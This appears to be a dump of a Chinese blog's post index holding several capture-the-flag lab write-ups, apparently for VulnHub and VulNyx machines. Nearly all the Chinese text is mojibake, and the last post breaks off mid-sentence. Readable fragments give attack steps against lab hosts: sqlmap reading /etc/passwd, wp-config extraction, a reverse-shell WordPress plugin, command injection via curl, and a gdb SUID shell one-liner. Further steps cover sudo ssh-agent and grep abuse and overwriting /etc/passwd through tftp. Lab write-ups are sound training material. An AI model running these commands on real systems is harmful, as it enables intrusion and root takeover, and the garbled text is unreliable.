æ˜¯ä¸ªwordpress æ³¨æ„æ”¹åŸŸå æ‰«æä¸‹ç›®å½• 1:è¿™é‡Œå‘ç°å¾ˆå¤šä¸œè¥¿ä½†æ˜¯æˆ‘ä¹Ÿæ²¡æ‰¾åˆ°ä»€ä¹ˆä¸œè¥¿èƒ½ç”¨ä¸Š- è¿™æ—¶å€™å°±ç”¨ç”¨wpscanæ‰«æä¸€ä¸‹ åªæ‰«äº†ä¸€ä¸ªç”¨æˆ·adminer 2:æ’ä»¶æ‰«å¤ªä¹…äº† å¡äº†å¾ˆä¹… é—®äº†ä¸‹è€å“¥ å°±ç”¨äº†ä¸‹nuclei æ²¡æƒ³åˆ°ç›´æ¥çˆ†å‡ºæ¥äº† â€‹ å°±æ˜¯è¿™ä¸ªCVE2015 è¿™é‡Œè¿˜æœ‰poc ä½ æ‹¿å»è®¿é—®ä¸‹å‘ç°ç›´æ¥çˆ†å‡ºäº† æ•°æ®åº“åå­— â€‹ è¿™é‡Œç›´æ¥å¯åŠ¨sqlmap ä½†æ˜¯æ³¨æ„ä½ ä¹Ÿè¦åˆ†æä¸‹è¿™ä¸ªpoc æˆ‘é€šè¿‡yakitä¿å­˜äº†æ•°æ®åŒ…ç„¶å -r æ¥ä½¿ç”¨è¦åœ¨å‚æ•°åé¢åŠ * 1ï¼šåé¢ç”¨sqlmapè¯»å–äº†æ•°æ®åº“wpå¯†ç ä½†æ˜¯æˆ‘ä¸ä¼šè§£å¯† è¯•äº†os ä¹Ÿä¸è¡Œ åˆè¯•äº†è¯•æ–‡ä»¶è¯»å–å¯ä»¥ poc: python .\\sqlmap.py -r .\\1234.txt â€“level 4 â€“risk2 â€“file-readâ€etcpasswdâ€ 2ï¼šæ³¨æ„çœ‹æ–‡ä»¶ä¿å­˜ä½ç½®ç„¶åå‘ç°äº†ä¸¤ä¸ªç”¨æˆ· ä¸€å…±jimmy ä¸€ä¸ª adminer ç„¶åç»å…¸çš„çˆ†ç ´ç›´æ¥ä¸è¡Œ å¥½å§ 3ï¼šç„¶åå› ä¸ºè¿™æ˜¯ä¸ªWPæœ‰wp-configè¿™ä¸ªæ–‡ä»¶çš„ ä½†æ˜¯æˆ‘ä¸çŸ¥é“ä½ç½® å°±åªèƒ½ä¸€ä¸ªä¸ªè¯• åœ¨varwwwwordpresswp-config.php é‡Œé¢è¯»å‡ºæ¥ç„¶åæœ‰æ•°æ®åº“çš„å¯†ç  æˆ‘ä»¬ä¸Šåˆ°è¿™é‡Œæ¥æ”¹wpç”¨æˆ·çš„å¯†ç  æ³¨æ„å®ƒæ˜¯md5 æ‰€ä»¥ä½ è¦æŠŠå¯†ç åŠ å¯†ä¸ºmd5æ”¾ä¸Šå»æ‰è¡Œ è¿™é‡Œæˆ‘æ”¾çš„æ˜¯111 ç„¶åæˆ‘ä»¬ç™»å½•wp wpåå¼¹shell ä¸€èˆ¬éƒ½æ˜¯å†™æ’ä»¶ è¿™é‡Œæˆ‘è¯•äº†ä¸‹ 4m3rr0rReverse-Shell-WordPress-Plugin: A WordPress plugin that provides reverse shell functionality with a graphical user interface (GUI) for configuration. This plugin allows users to configure and initiate a reverse shell connection to a specified IP address and port. å‘ç°ç”¨ä¸äº†åˆè¯•äº†è¯•ä¸‹é¢è¿™ä¸ªpayload ç„¶åæ”¾åˆ°å‹ç¼©æ–‡ä»¶é‡Œé¢ ä¸Šä¼  ä»–ç›´æ¥è‡ªåŠ¨æ‰§è¡Œäº† è®°å¾—æ¿€æ´» æ‹¿åˆ°shellæƒé™ è¿™é‡Œä½œè€…ç»™äº†adminerçš„å¯†ç  adminer123456 å¯èƒ½æœ‰bug ç›´æ¥ç»™æˆ‘äº† æ‹¿root è¿™é‡Œsudo å¯ä»¥ä½¿ç”¨grep ä½†æ˜¯ä»€ä¹ˆéƒ½åšä¸äº† ä½†æ˜¯ä½†æ˜¯ä½ æ³¨æ„åˆ°äº†æ²¡æœ‰â€”â€”â€”â€”â€”ä»–å¯å†™â€¦ è¿™é‡Œgrepé‡Œé¢å†™çš„æ˜¯ncå‘½ä»¤ ç„¶åé‚£è¾¹ncç›‘å¬å³å¯ æ€»ç»“ä¸€ä¸‹å–½1ï¼šæ‡µæ‡µæ‡‚æ‡‚çš„ ç†Ÿæ‚‰ä¸‹sqlmap 2ï¼šwpçš„æ’ä»¶åå¼¹shell 3ï¼šæ•°æ®åº“md5 ä¿®æ”¹ç”¨æˆ· 4ï¼šçœ‹æ–‡ä»¶å¯ä¸å¯å†™","tags":["wordpress","sqlmap"]},{"title":"å—ç›ŠåŒªæµ…translateé¶æœº---éš¾åº¦LOW-easy-çŸ¥è¯†ç‚¹-tmp-å®šæ—¶ä»»åŠ¡-socat","path":"/2025/05/28/posts/translate/","content":"translateé¶æœºâ€”éš¾åº¦LOW-easy-çŸ¥è¯†ç‚¹-tmp-å®šæ—¶ä»»åŠ¡-socat åªåšäº†user Nmapæ‰«æå‘ç°3ä¸ªç«¯å£å¼€æ”¾ â€‹ ä¸€è®¿é—®å‘ç°æ˜¯ä¸ªè½¯è›‹ æ‰«æä¸€ä¸‹ç›®å½• â€‹ è¿™é‡Œå‘ç°äº† ä¸€ä¸ªç™»å½•æ¡†ä½†æ˜¯æ²¡æœ‰çˆ†ç ´ä¹Ÿæ²¡ç”¨ï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹5001ç«¯å£å¯ä»¥ä¹Ÿdirä¸€ä¸‹å‘ç°infoç›®å½• â€‹ è¿›å…¥å«æˆ‘ä»¬å¯ä»¥æ„é€ æ•°æ®åŒ…è®¿é—®å¯ä»¥è·å–æ•°æ® æˆ‘ä»¬å¯ä»¥curl http://172.20.10.2:5001 -X POST -H â€˜Content-Type: applicationjsonâ€™ -d â€˜{â€œsource_langâ€:â€aâ€,â€target_langâ€:â€xâ€,â€text_listâ€:[â€œå°±ä½ ä¹Ÿæƒ³è¦è´¦å·ï¼Ÿï¼Ÿï¼Ÿï¼Ÿâ€]}â€™ è¿™ä¸ªå¯ä»¥è·å¾—å¯†ç  ä¹Ÿå¯ä»¥ å°±ä½ ä¹Ÿæƒ³è¦è´¦å·ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ ç›´æ¥æ¢æˆç³»ç»Ÿå‘½ä»¤ å› ä¸ºä½ æ”¹å‘½ä»¤å‘ç°å¯ä»¥æ‰§è¡Œ æ‹¿åˆ°è´¦å·å¯†ç  1ï¼šå¯ä»¥ç™»å½•é‚£ä¸ªçª—å£å¼¹shell 2ï¼šé€šè¿‡ä¸Šé¢ç›´æ¥æ‹¿shell éƒ½å¯ä»¥ æ‹¿åˆ°shellæƒé™æˆ‘ä»¬æ‹¿åˆ°æƒé™ç¿»å•Šç¿»æˆ‘ç¿»åˆ°opté‡Œé¢æœ‰ pspy64 è¿›ç¨‹æŸ¥çœ‹å·¥å…·å¯ä»¥æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ç­‰è¿›ç¨‹ â€‹ å‘ç°åœ¨æ‰§è¡Œtmpbash look look 1: wwwçš„ tmpç›®å½•çš„å’Œæ™®é€šç”¨æˆ·çš„æ˜¯ä¸åŒçš„ æ‰€ä»¥ä½ ç›´æ¥æŠŠå‘½ä»¤å†™åˆ°tmpæ˜¯ä¸è¡Œçš„ æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ­£å¸¸ç”¨æˆ·ä»–æ˜¯å¯ä»¥è®¿é—®tmpçš„ æˆ‘ä»¬è®¿é—®å®¶ç›®å½•å‘ç°æœ‰ä¸€ä¸ªç½‘é¡µå¼€äº†8000ç«¯å£ä½†æ˜¯æˆ‘ä»¬ä¸»æœºè®¿é—®ä¸åˆ°æˆ‘ä»¬socatä¸€ä¸‹ç«¯å£è½¬å‘ æŠŠæ–‡ä»¶å†™åˆ°user.txté‡Œé¢ç„¶åmv æˆ‘ä»¬ä¸»æœºå¯ä»¥è®¿é—®äº†å› ä¸ºè¿™ä¸ªç¨‹åºæ˜¯welcomeçš„æƒé™ å¹¶ä¸”å¯ä»¥æ‰§è¡Œmv è¿™å°±æ˜¯è§£é¢˜æœ€ä¼˜è§£åœ¨è¿™é‡Œ 2:åŒæ—¶å› ä¸ºæ˜¯welcomeçš„æƒé™å¯ä»¥è®¿é—®æ­£å¸¸tmpæ‰€ä»¥åå¼¹æˆåŠŸ æ‹¿root æ€»ç»“ä¸€ä¸‹å–½1ï¼šss -lntup æŸ¥çœ‹ç«¯å£è¿›ç¨‹ | socat å¯ä»¥è½¬å‘ç«¯å£ | pspy64 ä¸ç”¨rootå¯ä»¥çœ‹å®šæ—¶ä»»åŠ¡ç­‰ 2ï¼štmpç›®å½•wwwæ˜¯éš”ç¦»çš„ å’Œ æ™®é€šç”¨æˆ·ä¸åŒ wwwçš„æ–‡ä»¶åœ¨è¿™é‡Œè¢«apacheéš”ç¦»äº†","tags":["tmp","å®šæ—¶ä»»åŠ¡","socat"]},{"title":"basemeé¶æœº---éš¾åº¦LOW-çŸ¥è¯†ç‚¹-çˆ†ç ´sshå¯†é’¥-base64è¯­æ³•-","path":"/2025/05/26/posts/baseme/","content":"basemeé¶æœºâ€”éš¾åº¦LOW-çŸ¥è¯†ç‚¹-çˆ†ç ´sshå¯†é’¥-base64è¯­æ³•- Nmapæ‰«æå‘ç°ç»å…¸ç»„åˆä¸Šç½‘é¡µçœ‹çœ‹ è¿›å…¥ç½‘é¡µè§£å¯†ä¸Šé¢çš„base64 æç¤ºäº† ï¼šALL, absolutely ALL that you need is in BASE64.Including the password that you need :)Remember, BASE64 has the answer to all your questions.-lucas è¿™é‡Œè·å¾—äº†ä¸€ä¸ªç”¨æˆ·lucas æç¤ºåˆ°äº†åŒ…å«base64 å¯èƒ½æ˜¯ç”¨base64æ¥è·‘ç›®å½• æ—¢ç„¶éƒ½æåˆ°äº†base64æˆ‘ä»¬æŠŠä¸‹é¢æç¤ºæ¥base64æ¥è·‘ä¸€ä¸‹lucaså¯†ç å‘ç°ä¸è¡Œ ä½¿ç”¨ä¸‹é¢è¯­æ³• æ¥æŠŠå­—å…¸å˜ä¸ºbase64æ¥è·‘ä¸€ä¸‹ç›®å½• at usrsharedirbwordlistscommon.txt|awk â€˜{system(â€œecho â€œ$0â€|base64â€)}â€™ b.txt å‘ç°è·‘åˆ°äº†ç¿»è¯‘ä¸‹æ˜¯id_rsaç§é’¥æˆ‘ä»¬æ‹¿ç€ç§é’¥åç¼–è¯‘base64ç™»å½•å‘ç°è¦å¯†ç  è®°å¾—ç§é’¥ç»™æƒé™700ä¸ç„¶ç”¨ä¸äº† æˆ‘ä»¬ä½¿ç”¨ssh-keygen -y -f id_rsa2 å‘ç°ç¡®å®è¦å¯†ç  ä½†æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹ä¸æ˜¯æ‹¿åˆ°äº†ä¸€äº›å­—ç¬¦å—é‚£ä¸ªbase64æ¥è§£å¯†ä¸€ä¸‹è¯•è¯• å…ˆæŠŠç§é’¥è½¬æ¢base64ä½¿ç”¨ ssh2john æˆåŠŸè·‘åˆ°å¯†ç  å¦‚æœjohnå¡äº†å°±psä¸€ä¸‹ kill -9 è¿›ç¨‹å· æ‹¿åˆ°shellæƒé™æˆ‘ä»¬æ‹¿åˆ°ç§é’¥ç™»å½• å‘ç°å¯ä»¥ç”¨base64 æ‹¿rootè¿™é‡Œæ€è·¯ æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹¿root.txt sudo usrbinbase64 â€˜rootroot.txtâ€™ | base64 â€“decode ä¹Ÿå¯ä»¥åˆ¤æ–­å¯¹æ–¹rootæœ‰authæ–‡ä»¶ æˆ‘ä»¬æ‹¿ç§é’¥è¯•è¯• æ‹¿åˆ°åç»™æƒé™ç™»å½•å°±è¡Œ æ€»ç»“ä¸€ä¸‹1ï¼šawkç¼–è¾‘æ–‡æœ¬å‘½ä»¤ awk â€˜{system(â€œecho â€œ$0â€|base64â€)} 2ï¼šsshç§é’¥æ˜¯å¯ä»¥åŠ å¯†çš„ ä¸è¦å¿˜äº† ssh2johnæ¥è§£å¯†","tags":["ssh2john","base64"]},{"title":"connectioné¶æœº---éš¾åº¦LOW-çŸ¥è¯†ç‚¹-smb-enm4linux","path":"/2025/05/26/posts/connection/","content":"connectioné¶æœºâ€”éš¾åº¦LOW-çŸ¥è¯†ç‚¹-smb-enm4linux Nmapæ‰«æå‘ç° å‘ç°äº†ç»å…¸çš„445 ä½ å¯ä»¥ smbclient -L 172.20.10.2 -N åŒ¿åè®¿é—®æŸ¥çœ‹åˆ†äº«å†…å®¹ ä¹Ÿå¯ä»¥ enum4linux 172.20.10.2 å·¥å…·åˆ†æ å‘ç°äº†ä¸€ä¸ªç›®å½•å«shareè¿›å»å¯ä»¥ä¸Šä¼ æ–‡ä»¶æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªphpè„šæœ¬æˆ–è€…shell smbclient 172.20.10.2share ç›´æ¥ç™»å½•å›è½¦ æ‹¿åˆ°shellæƒé™ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¼¹åŠå¤©å¼¹ä¸ä¸Š ç”¨pythonå¯ä»¥å¼¹ä¸Š æ‹¿rootä¸Šä¼ æ‰«ææ–‡ä»¶linepas å‘ç°æœ‰ä¸€ä¸ªsuidæƒé™çš„gdb gdb -nx -ex python import os; os.execl(/bin/sh, sh, -p) -ex quit è¾“å…¥ä»£ç ææƒ æ€»ç»“ä¸€ä¸‹1ï¼šsmb -L æŸ¥çœ‹åˆ†äº«çš„ä¸œè¥¿ -N åŒ¿å","tags":["smb"]},{"title":"å¤§çª‘dayaoé¶æœº---éš¾åº¦LOW-çŸ¥è¯†ç‚¹-tftp-udp-å®šæ—¶ä»»åŠ¡","path":"/2025/05/26/posts/dayao/","content":"dayaoé¶æœº-çŸ¥è¯†ç‚¹-tftp69-å®šæ—¶ä»»åŠ¡ Nmapæ‰«æå‘ç°ä¸¤ä¸ªç«¯å£å¼€æ”¾ â€‹ è®¿é—®ä¸€ä¸‹ç½‘å€(ä»–æç¤ºäº†ç›®å½•ç©¿è¶Š) â€‹ â€‹ â€‹ åŒæ—¶dirsearchä¸€ä¸‹ è¿™é‡Œçš„aå’Œpasswdå’Œphpinfoæ˜¯æˆ‘åé¢å†™çš„ å‘ç°æœ‰ä¸€ä¸ªfile.phpå’Œupload.php æˆ‘ä»¬å¯ä»¥ä½¿ç”¨WFUZZæ¥çˆ†ç ´ä¸€ä¸‹ç›®å½•ç©¿è¶Šï¼ˆè¿™é‡Œä½¿ç”¨..å¯èƒ½è¢«è¿‡æ»¤äº†æˆ‘ä»¬åŒå†™ç»•è¿‡â€¦.ï¼‰ å‘ç°äº†fileå‚æ•°å¯ç”¨æˆ‘ä»¬ç›´æ¥ç½‘å€è®¿é—®ä¸‹å‘ç°äº†wujingå’ŒtftpæœåŠ¡è¿™æ˜¯UDPçš„æœåŠ¡69ç«¯å£æ‰€ä»¥æˆ‘ä»¬æ‰«æç«¯å£ä¸è¦å¿˜è®°æ‰«æUDPå•Šï¼ï¼ï¼ ç™»å½•è¯•è¯• æˆ‘ä»¬putä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šå»è¯•è¯•èƒ½ä¸èƒ½è®¿é—® å‘ç°å¯ä»¥ç›´æ¥è®¿é—®ç›´æ¥ä½¿ç”¨åå¼¹shell æ‹¿åˆ°shellæƒé™æ‹¿åˆ°äº†shellç¿»å•Šç¿»æ²¡ä»€ä¹ˆä¸œè¥¿æˆ‘ä»¬ç”¨ä¸€ä¸ªå·¥å…·å¯ä»¥æŸ¥çœ‹è¿›ç¨‹pspy å‘ç°æœ‰ä¸€ä¸ªNCåå¼¹å®šæ—¶ä»»åŠ¡ é€šè¿‡å¯†ç ç™»å½•login.php ç›´æ¥åå¼¹äº†wujing ![v æˆ‘ä»¬å…ˆå†™SSHå†™å®Œç™»å½•åsudo -l å‘ç°å¯ä»¥ä½¿ç”¨tftp æ‹¿rootè¿™é‡Œæ€è·¯æœ‰ï¼š â€‹ 1ï¼šæˆ‘ä»¬æŠŠpasswdä¸‹è½½ä¸‹æ¥ ä¿®æ”¹é‡Œé¢rooté‡Œé¢çš„xä¸ºhashå€¼111111ä½¿ç”¨mkpasswdç”Ÿæˆ â€‹ 2: æˆ‘ä»¬åœ¨etcä¸‹é¢get passwdæ–‡ä»¶è¦†ç›–åŸå…ˆçš„passwdç„¶åç™»å½• åœ¨etcä¸‹é¢getè¦†ç›– ç„¶åç™»å½•root æ‹¿åˆ°ROOTæƒé™ æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥ç”¨findæ¥çœ‹çœ‹æ–°çš„æ–‡ä»¶1ï¼špsé‡Œé¢æŸ¥çœ‹ä¸äº†çš„å¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥æŸ¥çœ‹å…¨é¢ 2ï¼šnmapæ‰«æå¯ä»¥æ‰«æUDPä¸åªæœ‰TCP 3ï¼šç›®å½•ç©¿è¶Šå¯ä»¥åŒå†™è¿‡æ»¤ 4ï¼špasswdé‡Œé¢xä¿®æ”¹åä¸shadowé‡Œé¢å¯†ç å¯èƒ½æœ‰é€ æˆç³»ç»Ÿé—®é¢˜ è‡ªå·±æœºå™¨åˆ«çæ”¹","tags":["creatab","tftp"]},{"title":"VUlNyx-infectedé¶æœº---éš¾åº¦LOW-çŸ¥è¯†ç‚¹-backdoor-module","path":"/2025/05/23/posts/infected/","content":"VulNyx-infectedé¶æœº-çŸ¥è¯†ç‚¹-module Nmapæ‰«æå‘ç°ä¸¤ä¸ªç«¯å£å¼€æ”¾ åŒæ—¶dirsearchä¸€ä¸‹ å¯ä»¥åªæœ‰ä¸€ä¸ªinfo.php æ‰“å¼€æ˜¯ä¸€ä¸ªphpinfoç•Œé¢ è¿™é‡Œæˆ‘çˆ†ç ´äº†ä½†æ˜¯æ²¡ç”¨çœ‹äº†ä¸‹WPå‘ç°æœ‰ä¸€ä¸ªmodule backdoor å¯ä»¥åˆ©ç”¨ å‘½ä»¤å°±æ˜¯åœ¨æ–‡ä»¶å¤´åŠ ä¸Š Backdoor: ç³»ç»Ÿå‘½ä»¤ æ‹¿åˆ°shellæƒé™å¾ˆç®€å•ç›´æ¥sudo -l ä¸Šç½‘ç«™https://gtfobins.github.io/ æœå¯¹åº”çš„ææƒå³å¯åé¢éƒ½å¾ˆç®€å• ç„¶åæˆ‘ä»¬åŠ ä¸€ä¸ªSSH ç™»å½•æ–¹é¢å…å¾—æœ‰äº›åŠŸèƒ½ä¸èƒ½ç”¨ SSHç™»å½•å‘ç°å¯ä»¥ç”¨ä¸€ä¸ªjoe joe:æ˜¯ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ é€šè¿‡ctrl+k ! binbash å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤é€ æˆææƒ ææƒROOT æ‹¿åˆ°root æ€»ç»“ä¸€ä¸‹PHPinfoé‡Œé¢å¯ä»¥çœ‹é…ç½®ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹æ¨¡ç»„","tags":["module"]},{"title":"Vulnyx-agenté¶æœº-LOW-çŸ¥è¯†ç‚¹-Agent-dirbå·¥å…·","path":"/2025/05/22/posts/agent/","content":"Vulnyx-agenté¶æœº-LOW-çŸ¥è¯†ç‚¹-Agent-dirbå·¥å…· NMAPå‘ç°1:nmapé¶æœºå‘ç°å¼€äº†ä¸¤ä¸ªç«¯å£80å’Œ22 2:æˆ‘ä»¬ä¸Šç½‘é¡µçœ‹çœ‹å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç°ç„¶åä½¿ç”¨dirsearchä»€ä¹ˆéƒ½æ‰«ä¸åˆ° 3:ç„¶åè¿™é‡Œç­‰äº†å¾ˆä¹…ä¸çŸ¥é“å¹²å˜›çœ‹äº†ä¸‹WPçœ‹äº†ä¸€ä¸‹å·¥å…·å‘ç°è¿˜æœ‰ä¸€ä¸ªå«dirbçš„ä»–å’ŒdirsearchåŒºåˆ«æ˜¯æœ‰ä¸€ä¸ªé€’å½’æŸ¥è¯¢æˆ‘ä»¬ç”¨å®ƒæ¥æŸ¥è¯¢å¯ä»¥å‘ç°çˆ†ç ´å‡ºæ¥äº†å¾ˆå¤š 4:å‘ç°ä¸€ä¸ªwebsvn æˆ‘ä»¬å¯ä»¥ç›´æ¥ç™»å½•çœ‹çœ‹é¡µé¢ 5ï¼šç›´æ¥æœä¸€æœnday ç„¶åå‘ç°ç›´æ¥å¯ä»¥å¼¹shell æˆåŠŸæ‹¿åˆ°webshell 1:æˆ‘ä»¬æ‹¿åˆ°çš„shellåæˆ‘ç¿»äº†å¾ˆå¤šæ–‡ä»¶å‘ç°ä¸è¡Œ çˆ†ç ´äº†ä¹Ÿæ²¡çˆ†ç ´å‡ºæ¥ç”¨æˆ·å«dustinçš„æˆ‘ä»¬è¯•è¯•sudo -lå‘ç°å¯ä»¥ç”¨ä¸€ä¸ªå«C99çš„ç¨‹åº ï¼ˆCè¯­è¨€æ ‡å‡†ç‰ˆæœ¬ï¼‰è¿™é‡Œæ³¨æ„ç”¨è¿™ä¸ªc99éœ€è¦ä¸€ä¸ªç»ˆç«¯æˆ‘ä»¬æ¥ä¸Šä¸€ä¸ªç»ˆç«¯ 2ï¼šè¿™é‡Œç”¨-u dustinæ¥ä½¿ç”¨ç„¶ååˆ°https://gtfobins.github.io/gtfobins/c99/ æ¥ä½¿ç”¨ææƒä»£ç  ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨æˆ‘ä»¬è®¾ç½®ä¸‹SSHå…¬é’¥ç™»å½• 3:å…¬é’¥ç™»å½•åç›´æ¥sudo -lå‘ç°å¯ä»¥ç”¨ä¸€ä¸ªå«ssh-agentçš„ssh-agent: æ˜¯ä¸€ç§ç”¨äºç®¡ç† SSH å¯†é’¥çš„å·¥å…·,é€šè¿‡å°†ç§é’¥åŠ è½½åˆ° ssh-agent ä¸­ï¼Œåç»­è¿æ¥æ—¶æ— éœ€æ‰‹åŠ¨è¾“å…¥ç§é’¥å¯†ç  æˆ‘ä»¬ä¾ç„¶åœ¨å‰é¢æœç´¢ä¸‹ææƒä»£ç  sudo usrbinssh-agent binbash æˆåŠŸget root TIPs1ï¼šdirb æ˜¯ä¸€ä¸ªé€’å½’çš„çˆ†ç ´å’Œdirsearchä¸åŒ é»˜è®¤å­—å…¸åœ¨usrsharedirbwordlistscommon.txt è¿˜æœ‰ä¸€ä¸ªå¯†ç å­—å…¸æ¨èä¸‹usrsharejohnpassword.lst 2ï¼šsudo -u xx æŒ‡å®šç”¨æˆ·ä½¿ç”¨å‘½ä»¤","tags":["Agent","dirb"]},{"title":"Commité¶æœº---éš¾åº¦LOW-çŸ¥è¯†ç‚¹-bash_history","path":"/2025/05/19/posts/Commit/","content":"Commité¶æœº-çŸ¥è¯†ç‚¹-çœ‹ æˆ‘æ˜¯æ‡¦å¤«æˆ‘æ²¡åšå‡ºæ¥ Nmapæ‰«æå‘ç°ä¸¤ä¸ªç«¯å£å¼€æ”¾ åŒæ—¶dirsearchä¸€ä¸‹ å¯ä»¥å‘ç°æœ‰å‡ ä¸ªç›®å½• æ‹¿åˆ°shellæƒé™ä½†æ˜¯æˆ‘ä»¬ä¾æ¬¡è®¿é—®æˆ–è€…å¯¹ç™»å½•å£åšçˆ†ç ´å•Š sqlæ³¨å…¥å•Šå‘ç°æ²¡æœ‰ è¿™æ—¶å€™å¯ä»¥çœ‹çœ‹æºç ï¼ˆå…¶å®ä¸€å¼€å§‹å°±å¯ä»¥çœ‹çœ‹ï¼‰ é€šè¿‡å¯†ç ç™»å½•login.php ä½†æ˜¯æˆ‘æµ‹è¯•å¾ˆä¹…çš„ä¸Šä¼ å’ŒPINGï¼›éƒ½ä¸è¡Œ å› ä¸ºæœ‰ä¸€ä¸ªuploadæ–‡ä»¶å¤¹æƒ³åˆ°ä¸Šä¼ åå¯ä»¥åŒ…å«ä¸€ä¸‹é€šè¿‡æºç ä¸‹é¢çš„fileå‚æ•°ä½†æ˜¯éƒ½åŠ è½½ä¸äº† äºæ˜¯æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹etcpasswdå‘ç°å¯ä»¥â€“ä½†æ˜¯å…¶ä»–éƒ½åšä¸äº†ä½†æ˜¯æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªç”¨æˆ·lingmj è¿™æ—¶å€™å°±è¦æƒ³åˆ°.bash_historyäº† å†æŸ¥çœ‹gitconfig æ‹¿åˆ°ä¸€ä¸ªå¯†ç ç›´æ¥ç™»å½•æ‹¿åˆ°shell å’Œuserflag æ‹¿root1:æˆ‘ä»¬å¯ä»¥çœ‹çœ‹SSHçš„é…ç½®æ–‡ä»¶å› ä¸ºå®ƒæ”¹ç«¯å£äº†2222äº† å‘ç°æœ‰Rootå¯†ç ä½†æ˜¯æ‹’ç»äº†SSHç™»å½•æˆ‘ä»¬å¯ä»¥æœ¬åœ°ç™»å½•è¿‡å» 2ï¼šæˆ‘ä»¬å¯ä»¥ç¿»é˜…etcä¸‹é¢çš„passwd- å’Œshadow-è·å–ä¿¡æ¯ å‘ç°passwdæˆ‘ä»¬å¯ä»¥çœ‹é€šè¿‡passwd-ä»¥å‰çš„é…ç½®æ–‡ä»¶å‘ç°æ³¨é‡Šæœ‰ä¸€ä¸ªå¯†ç  æ˜¯welcomeçš„ ç™»å½•ä¸Šå»ä¹Ÿæ²¡å•¥ç”¨ æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥ç”¨findæ¥çœ‹çœ‹æ–°çš„æ–‡ä»¶find -newer etcpasswd 2a | grep -Pv â€˜sys|proc|var|run|share|dev|tmp|gitâ€™ -newer /etc/passwd ï¼šæ¯”etcpasswdæ–°çš„ é€šè¿‡æ­£åˆ™è¿‡æ»¤æ‰sys|proc|var|run|share|dev|tmp|gitå¼€å¤´ å°±ä¼šå‘ç°æ–°çš„æ–‡ä»¶ å¤šçœ‹çœ‹ä¸€äº›é…ç½®æ–‡ä»¶å¯¹ä¸€äº›ä¸œè¥¿å¾ˆæ•æ„Ÿæ¯”å¦‚ç«¯å£æ”¹äº†ä½ å°±åº”è¯¥å»çœ‹çœ‹SSHé…ç½®æ–‡ä»¶","tags":["bash_history","SSH"]},{"title":"ç¾¤å‹Qingmeié¶æœº-LOW-çŸ¥è¯†ç‚¹-SSH","path":"/2025/05/19/posts/Qingmei/","content":"Qingmeié¶æœº çŸ¥è¯†ç‚¹-banner NMAPå‘ç°nmapé¶æœºå‘ç°å¼€äº†ä¸¤ä¸ªç«¯å£80å’Œ22ä½†æ˜¯æˆ‘ä»¬åˆ°ç½‘é¡µå‘ç°ä¸åˆ°ä»€ä¹ˆç›®å½•ä¹Ÿæ‰«ä¸åˆ°ä»€ä¹ˆæˆ‘ä»¬å¯ä»¥SSHè¯•ä¸€è¯•çœ‹çœ‹ å‘ç°ä¸€ä¸ªbannerå†™äº†è´¦å·å’Œå¯†ç æˆ‘ä»¬ç›´æ¥ç™»å½•ä¸Šå» ps:bannerå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰æ˜¾ç¤ºçš„ä¸œè¥¿ ä½ ä¸€ä¸Šå»å°±æ˜¾ç¤ºå‡ºæ¥çš„æ¯”å¦‚ä¸‹é¢çš„ç‰›å­ ä¸€è¿›å»ç‚¹ä¸‹hå¼¹å‡ºå‘½ä»¤ç•Œé¢ç›´æ¥ä¸‹æ‹‰çœ‹åˆ°äº†ä¸€ä¸ª!command å¯ä»¥è¯•ä¸€ä¸‹command id è¯•è¯•å¯ä»¥ä¸å¯ä»¥æ‰§è¡Œå‡ºå‘½ä»¤ å‘ç°å¯ä»¥æ‰§è¡Œå‡ºå‘½ä»¤ é‚£å¯ä»¥ç›´æ¥å¼¹SHELL æˆ–è€…!shè¯•è¯• ä½†æ˜¯æˆ‘ä»¬ç”¨ç€ç‰¹åˆ«éš¾å— å¼€ä¸€ä¸ªç»ˆç«¯å°±è¦é‡æ–°è¿›å»é‚£ä¸ªç•Œé¢è¿™é‡Œä»‹ç»ä¸€ä¸ªæ–‡ä»¶ .bashrcï¼šç”¨äºå‚¨å­˜ç”¨æˆ·çš„ä¸ªæ€§åŒ–è®¾ç½®ã€‚åœ¨æ¯æ¬¡æ‰“å¼€æ–°çš„ç»ˆç«¯æ—¶è‡ªåŠ¨æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤æˆ–è„šæœ¬ æˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸æ˜¯æ·»åŠ äº†ä»€ä¹ˆ å‘ç°æœ‰ä¸€ä¸ªless banner ç„¶åexitæˆ‘ä»¬æŠŠå®ƒåˆ é™¤ç„¶åsshçœ‹çœ‹å¯ä»¥ç™»å½•ä¸ tail -n 2 ~.bashrc :å–åä¸¤è¡ŒæŸ¥çœ‹ sed -i â€˜$d;$dâ€™ ~.bashrc ï¼šåˆ é™¤æœ€åä¸¤è¡Œ ç„¶åæˆ‘ä»¬å¼¹ç»ˆç«¯å°±ä¸ä¼šè¿›å…¥é‚£ä¸ªç•Œé¢æˆ–è€…ç›´æ¥SSHç™»å½•ä¸Šå»å°±è¡Œ ç„¶åæˆ‘ä»¬è¦ç ”ç©¶ä¸‹æ€ä¹ˆææƒ æˆ‘ä»¬å‘ç°home ä¸‹é¢æœ‰ä¸€ä¸ªmorri ç”¨æˆ·æˆ‘ä»¬è¿›å…¥ä¸äº† 1ï¼šæˆ‘ä»¬ç›´æ¥SSH çŒœæµ‹å¼±å¯†ç morri 2:ç¿»åˆ°äº†optä¸‹é¢çš„æ–‡ä»¶æœ‰ä¸€ä¸ª ä»–å«ä½ 